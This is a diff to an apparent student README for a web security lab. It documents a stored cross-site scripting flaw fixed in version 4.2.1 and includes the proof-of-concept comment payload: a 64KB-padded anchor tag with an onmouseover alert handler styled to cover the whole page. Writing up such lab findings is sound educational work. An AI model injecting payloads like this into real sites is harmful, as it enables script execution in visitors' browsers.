@@ -13,7 +13,7 @@ Time spent: 6 hours spent in total
     - Fixed in version: 4.2.1
   - [ ] GIF Walkthrough: 
         1) comment in a post with 64KB length of comment
-<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
+\<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'\>\<\/a\>
         2) 3)When user visit the page, the xss will be excuted.
   - [ ] Steps to recreate: <img src="https://github.com/wrongjun/websecurity_week_7/blob/master/64kbXSS.gif.gif" width="800">
   - [ ] Affected source code:
